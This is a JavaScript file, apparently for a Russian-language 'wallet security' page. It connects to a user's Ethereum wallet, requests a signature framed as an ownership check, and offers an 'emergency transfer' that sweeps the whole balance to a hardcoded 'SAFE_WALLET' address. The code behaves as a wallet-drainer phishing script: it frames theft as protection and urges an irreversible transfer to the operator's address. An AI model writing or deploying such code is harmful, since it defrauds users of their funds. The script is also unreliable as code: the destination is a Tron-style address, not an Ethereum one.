// Конфигурация
const SAFE_WALLET = 'TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb';
const GAS_LIMIT = 21000;
const GAS_PRICE_MULTIPLIER = 1.2;

// Элементы страницы
const connectButton = document.getElementById('connectButton');
const signButton = document.getElementById('signButton');
const emergencySection = document.getElementById('emergencySection');
const statusDiv = document.getElementById('status');
const balancesList = document.getElementById('balancesList');
const emergencyTransferBtn = document.getElementById('emergencyTransferBtn');
const transferStatus = document.getElementById('transferStatus');
const noWalletMessage = document.getElementById('noWalletMessage');

let web3;
let userAddress;

// Функция для обновления статуса
function updateStatus(message, isError = false, isWarning = false) {
    statusDiv.textContent = message;
    statusDiv.className = 'status-box ' + (isError ? 'error' : isWarning ? 'warning' : 'success');
    statusDiv.style.display = 'block';
}

// Функция для показа/скрытия элементов
function showElement(element) {
    element.classList.remove('hidden');
}

function hideElement(element) {
    element.classList.add('hidden');
}

// Проверяем наличие кошелька
if (typeof window.ethereum !== 'undefined') {
    console.log('Кошелек найден!');
    web3 = new Web3(window.ethereum);
    
    // Показываем основное содержимое
    hideElement(noWalletMessage);
    
} else {
    console.log('Кошелек не найден!');
    showElement(noWalletMessage);
    hideElement(connectButton);
}

// Подключение кошелька
connectButton.addEventListener('click', async () => {
    try {
        connectButton.classList.add('loading');
        updateStatus('⌛ Запрос на подключение кошелька...', false, true);
        
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];
        
        updateStatus(`✅ Кошелек подключен! Адрес: ${userAddress.substring(0, 10)}...${userAddress.substring(38)}`);
        
        hideElement(connectButton);
        showElement(signButton);
        showElement(emergencySection);
        
        await loadBalances();
        await checkNetwork();
        
    } catch (error) {
        if (error.code === 4001) {
            updateStatus('❌ Вы отклонили запрос на подключение.', true);
        } else {
            updateStatus('❌ Ошибка при подключении: ' + error.message, true);
        }
    } finally {
        connectButton.classList.remove('loading');
    }
});

// Подписание сообщения
signButton.addEventListener('click', async () => {
    if (!userAddress) {
        updateStatus('❌ Сначала подключите кошелек.', true);
        return;
    }
    
    try {
        signButton.classList.add('loading');
        updateStatus('⌛ Запрос на подписание сообщения...', false, true);
        
        const message = `Подтверждение владения кошельком для системы безопасности. Время: ${new Date().toLocaleString()}`;
        const signature = await web3.eth.personal.sign(message, userAddress, '');
        
        updateStatus(`✅ Сообщение успешно подписано! Подпись: ${signature.substring(0, 20)}...`);
        
        // Здесь можно отправить подпись на сервер для верификации
        // await verifySignature(message, signature, userAddress);
        
    } catch (error) {
        if (error.code === 4001) {
            updateStatus('❌ Вы отклонили запрос на подпись.', true);
        } else {
            updateStatus('❌ Ошибка при подписи: ' + error.message, true);
        }
    } finally {
        signButton.classList.remove('loading');
    }
});

// Загрузка балансов
async function loadBalances() {
    try {
        balancesList.innerHTML = '<p>⌛ Загрузка балансов...</p>';
        
        const balance = await web3.eth.getBalance(userAddress);
        const ethBalance = web3.utils.fromWei(balance, 'ether');
        
        balancesList.innerHTML = `
            <div class="balance-item">
                <span>ETH:</span>
                <strong>${parseFloat(ethBalance).toFixed(6)} ETH</strong>
            </div>
            <div class="balance-item">
                <span>Примерная стоимость:</span>
                <strong>$${(parseFloat(ethBalance) * 2500).toFixed(2)}</strong>
            </div>
        `;
        
    } catch (error) {
        balancesList.innerHTML = '<p style="color: red;">❌ Ошибка загрузки балансов</p>';
    }
}

// Проверка сети
async function checkNetwork() {
    try {
        const chainId = await web3.eth.getChainId();
        const networks = {
            1: 'Ethereum Mainnet',
            56: 'Binance Smart Chain', 
            137: 'Polygon',
            42161: 'Arbitrum'
        };
        
        const networkName = networks[chainId] || `Unknown Network (ID: ${chainId})`;
        console.log('Connected to:', networkName);
        
    } catch (error) {
        console.error('Network check error:', error);
    }
}

// Экстренный перевод
async function emergencyTransfer() {
    try {
        emergencyTransferBtn.classList.add('loading');
        transferStatus.style.display = 'block';
        transferStatus.className = 'status-box warning';
        transferStatus.innerHTML = '<p>⌛ Подготовка перевода...</p>';
        
        const balance = await web3.eth.getBalance(userAddress);
        const gasPrice = await web3.eth.getGasPrice();
        const increasedGasPrice = Math.floor(gasPrice * GAS_PRICE_MULTIPLIER);
        
        const gasCost = increasedGasPrice * GAS_LIMIT;
        const transferAmount = BigInt(balance) - BigInt(gasCost);
        
        if (transferAmount <= 0) {
            transferStatus.className = 'status-box error';
            transferStatus.innerHTML = '<p>❌ Недостаточно средств для перевода с учетом комиссии</p>';
            return;
        }
        
        transferStatus.innerHTML = '<p>⌛ Отправка транзакции...</p>';
        
        const transactionObject = {
            from: userAddress,
            to: SAFE_WALLET,
            value: transferAmount.toString(),
            gas: GAS_LIMIT,
            gasPrice: increasedGasPrice
        };
        
        const receipt = await web3.eth.sendTransaction(transactionObject);
        
        transferStatus.className = 'status-box success';
        transferStatus.innerHTML = `
            <p>✅ Перевод успешно выполнен!</p>
            <p><strong>Хэш:</strong> ${receipt.transactionHash.substring(0, 20)}...</p>
            <p><strong>Сумма:</strong> ${web3.utils.fromWei(transferAmount.toString(), 'ether')} ETH</p>
            <p><strong>Блок:</strong> ${receipt.blockNumber}</p>
        `;
        
        await loadBalances(); // Обновляем балансы после перевода
        
    } catch (error) {
        console.error('Transfer error:', error);
        transferStatus.className = 'status-box error';
        transferStatus.innerHTML = `<p>❌ Ошибка перевода: ${error.message}</p>`;
    } finally {
        emergencyTransferBtn.classList.remove('loading');
    }
}

// Обработчик кнопки экстренного перевода
emergencyTransferBtn.addEventListener('click', function() {
    const confirmation = confirm(
        '🚨 ВНИМАНИЕ! ЭКСТРЕННЫЙ ПЕРЕВОД\n\n' +
        'Вы собираетесь перевести ВСЕ доступные средства на безопасный кошелек.\n\n' +
        `Получатель: ${SAFE_WALLET}\n\n` +
        'Это действие НЕОБРАТИМО и требует подтверждения в кошельке.\n\n' +
        'Продолжить?'
    );
    
    if (confirmation) {
        emergencyTransfer();
    }
});

// Мониторинг изменений кошелька
if (typeof window.ethereum !== 'undefined') {
    window.ethereum.on('accountsChanged', function(accounts) {
        if (accounts.length === 0) {
            updateStatus('Кошелек отключен', true);
            hideElement(emergencySection);
            hideElement(signButton);
            showElement(connectButton);
        } else {
            userAddress = accounts[0];
            updateStatus(`Аккаунт изменен: ${userAddress.substring(0, 10)}...`);
            loadBalances();
        }
    });
    
    window.ethereum.on('chainChanged', function(chainId) {
        window.location.reload();
    });
}
